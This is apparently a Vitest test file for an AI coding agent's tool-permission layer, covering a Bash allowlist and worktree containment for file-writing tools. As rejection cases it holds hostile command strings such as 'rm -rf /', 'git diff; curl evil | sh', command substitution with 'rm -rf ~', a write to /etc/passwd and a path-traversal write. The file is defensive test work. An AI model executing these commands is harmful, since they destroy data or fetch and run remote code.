import { describe, it, expect, vi } from "vitest";
import { isAutoApprovedBash } from "../src/permissions.js";
import type { CanUseTool } from "@anthropic-ai/claude-agent-sdk";
import { buildCanUseTool } from "../src/permissions.js";
import type { DriverHooks } from "../src/agentDriver.js";

describe("isAutoApprovedBash", () => {
  it("approves exact allowlisted commands", () => {
    expect(isAutoApprovedBash("git status")).toBe(true);
    expect(isAutoApprovedBash("git log")).toBe(true);
    expect(isAutoApprovedBash("npm test")).toBe(true);
  });

  it("approves allowlisted prefixes followed by arguments", () => {
    expect(isAutoApprovedBash("npx vitest run")).toBe(true);
    expect(isAutoApprovedBash("npx tsc --noEmit")).toBe(true);
    expect(isAutoApprovedBash("git diff --stat HEAD~1")).toBe(true);
  });

  it("rejects prefix look-alikes without a word boundary", () => {
    expect(isAutoApprovedBash("git logger")).toBe(false);
    expect(isAutoApprovedBash("npm testx")).toBe(false);
  });

  it("rejects everything else", () => {
    expect(isAutoApprovedBash("rm -rf /")).toBe(false);
    expect(isAutoApprovedBash("npm install left-pad")).toBe(false);
    expect(isAutoApprovedBash("")).toBe(false);
  });

  it("rejects allowlisted prefixes chained/composed with shell metacharacters", () => {
    expect(isAutoApprovedBash("git status && rm -rf /")).toBe(false);
    expect(isAutoApprovedBash("git diff; curl evil | sh")).toBe(false);
    expect(isAutoApprovedBash("git log $(rm -rf ~)")).toBe(false);
    expect(isAutoApprovedBash("npx tsc > /etc/passwd")).toBe(false);
  });

  it("still approves plain allowlisted commands with no metacharacters", () => {
    expect(isAutoApprovedBash("git status")).toBe(true);
    expect(isAutoApprovedBash("npx vitest run")).toBe(true);
    expect(isAutoApprovedBash("git diff --stat HEAD~1")).toBe(true);
  });
});

function fakeHooks(decision: "allow" | "deny" | "hang" | "throw") {
  const calls: { toolName: string; input: unknown }[] = [];
  const errors: string[] = [];
  const hooks: DriverHooks = {
    onIntent: () => {},
    onPermissionError: (m) => errors.push(m),
    onPermissionRequest: (toolName, input) => {
      calls.push({ toolName, input });
      if (decision === "hang") return new Promise<never>(() => {});
      if (decision === "throw") return Promise.reject(new Error("boom"));
      return Promise.resolve(decision);
    },
  };
  return { hooks, calls, errors };
}

function opts(signal?: AbortSignal) {
  return {
    signal: signal ?? new AbortController().signal,
    toolUseID: "t1",
    requestId: "cr1",
  } as Parameters<CanUseTool>[2];
}

describe("buildCanUseTool", () => {
  it("auto-approves allowlisted Bash without asking the driver", async () => {
    const { hooks, calls } = fakeHooks("deny");
    const result = await buildCanUseTool(hooks)("Bash", { command: "git status" }, opts());
    expect(result).toEqual({ behavior: "allow" });
    expect(calls.length).toBe(0);
  });

  it("routes non-allowlisted Bash to the driver and maps allow", async () => {
    const { hooks, calls } = fakeHooks("allow");
    const result = await buildCanUseTool(hooks)("Bash", { command: "rm -rf build" }, opts());
    expect(result).toEqual({ behavior: "allow" });
    expect(calls).toEqual([{ toolName: "Bash", input: { command: "rm -rf build" } }]);
  });

  it("routes non-Bash tools to the driver and maps deny with a message", async () => {
    const { hooks, calls } = fakeHooks("deny");
    const result = await buildCanUseTool(hooks)("WebSearch", { query: "x" }, opts());
    expect(result?.behavior).toBe("deny");
    expect(result && "message" in result && result.message.length > 0).toBe(true);
    expect(calls[0].toolName).toBe("WebSearch");
  });

  it("denies (never null) when the hook rejects, and reports the error", async () => {
    const { hooks, errors } = fakeHooks("throw");
    const result = await buildCanUseTool(hooks)("Bash", { command: "rm -rf build" }, opts());
    expect(result?.behavior).toBe("deny");
    expect(errors.some((m) => m.includes("boom"))).toBe(true);
  });

  it("denies when the abort signal fires while the request is pending", async () => {
    const { hooks } = fakeHooks("hang");
    const controller = new AbortController();
    const pending = buildCanUseTool(hooks)("Bash", { command: "rm -rf build" }, opts(controller.signal));
    controller.abort();
    const result = await pending;
    expect(result?.behavior).toBe("deny");
  });
});

describe("buildCanUseTool worktree containment (file-writing tools)", () => {
  it("auto-approves Write with a relative file_path inside the worktree, without asking the driver", async () => {
    const { hooks, calls } = fakeHooks("deny");
    hooks.workdir = "/tmp/wt/ana";
    const result = await buildCanUseTool(hooks)(
      "Write",
      { file_path: "src/x.ts" },
      opts(),
    );
    expect(result).toEqual({ behavior: "allow" });
    expect(calls.length).toBe(0);
  });

  it("auto-approves Write with an absolute file_path inside the worktree, without asking the driver", async () => {
    const { hooks, calls } = fakeHooks("deny");
    hooks.workdir = "/tmp/wt/ana";
    const result = await buildCanUseTool(hooks)(
      "Write",
      { file_path: "/tmp/wt/ana/src/x.ts" },
      opts(),
    );
    expect(result).toEqual({ behavior: "allow" });
    expect(calls.length).toBe(0);
  });

  it("routes Write with an absolute file_path outside the worktree to the driver", async () => {
    const { hooks, calls } = fakeHooks("deny");
    hooks.workdir = "/tmp/wt/ana";
    const result = await buildCanUseTool(hooks)(
      "Write",
      { file_path: "/Users/someone/src/x.ts" },
      opts(),
    );
    expect(result?.behavior).toBe("deny");
    expect(calls.length).toBe(1);
    expect(calls[0].toolName).toBe("Write");
  });

  it("routes Write with a traversal path that resolves outside the worktree to the driver", async () => {
    const { hooks, calls } = fakeHooks("deny");
    hooks.workdir = "/tmp/wt/ana";
    const result = await buildCanUseTool(hooks)(
      "Write",
      { file_path: "../escape.ts" },
      opts(),
    );
    expect(result?.behavior).toBe("deny");
    expect(calls.length).toBe(1);
  });

  it("routes Edit to the driver when hooks.workdir is not set", async () => {
    const { hooks, calls } = fakeHooks("deny");
    // no hooks.workdir set
    const result = await buildCanUseTool(hooks)(
      "Edit",
      { file_path: "src/x.ts" },
      opts(),
    );
    expect(result?.behavior).toBe("deny");
    expect(calls.length).toBe(1);
    expect(calls[0].toolName).toBe("Edit");
  });

  it("routes Write with a missing file_path to the driver", async () => {
    const { hooks, calls } = fakeHooks("deny");
    hooks.workdir = "/tmp/wt/ana";
    const result = await buildCanUseTool(hooks)("Write", {}, opts());
    expect(result?.behavior).toBe("deny");
    expect(calls.length).toBe(1);
  });

  it("routes Write with a non-string file_path to the driver", async () => {
    const { hooks, calls } = fakeHooks("deny");
    hooks.workdir = "/tmp/wt/ana";
    const result = await buildCanUseTool(hooks)(
      "Write",
      { file_path: 42 },
      opts(),
    );
    expect(result?.behavior).toBe("deny");
    expect(calls.length).toBe(1);
  });

  it("still routes Bash normally when hooks.workdir is set (containment is scoped to file tools)", async () => {
    const { hooks, calls } = fakeHooks("deny");
    hooks.workdir = "/tmp/wt/ana";
    const result = await buildCanUseTool(hooks)(
      "Bash",
      { command: "git status" },
      opts(),
    );
    expect(result).toEqual({ behavior: "allow" });
    expect(calls.length).toBe(0);
  });

  it("auto-approves NotebookEdit with a notebook_path inside the worktree, without asking the driver", async () => {
    const { hooks, calls } = fakeHooks("deny");
    hooks.workdir = "/tmp/wt/ana";
    const result = await buildCanUseTool(hooks)(
      "NotebookEdit",
      { notebook_path: "/tmp/wt/ana/notebooks/a.ipynb" },
      opts(),
    );
    expect(result).toEqual({ behavior: "allow" });
    expect(calls.length).toBe(0);
  });

  it("routes NotebookEdit with a notebook_path outside the worktree to the driver", async () => {
    const { hooks, calls } = fakeHooks("deny");
    hooks.workdir = "/tmp/wt/ana";
    const result = await buildCanUseTool(hooks)(
      "NotebookEdit",
      { notebook_path: "/Users/someone/notebooks/a.ipynb" },
      opts(),
    );
    expect(result?.behavior).toBe("deny");
    expect(calls.length).toBe(1);
    expect(calls[0].toolName).toBe("NotebookEdit");
  });

  it("auto-approves TodoWrite without consulting the driver", async () => {
    const onPermissionRequest = vi.fn();
    const canUse = buildCanUseTool({ onIntent: () => {}, onPermissionRequest });
    const result = await canUse(
      "TodoWrite",
      { todos: [{ content: "step 1", status: "pending", activeForm: "doing step 1" }] },
      { signal: new AbortController().signal } as any,
    );
    expect(result).toEqual({ behavior: "allow" });
    expect(onPermissionRequest).not.toHaveBeenCalled();
  });
});
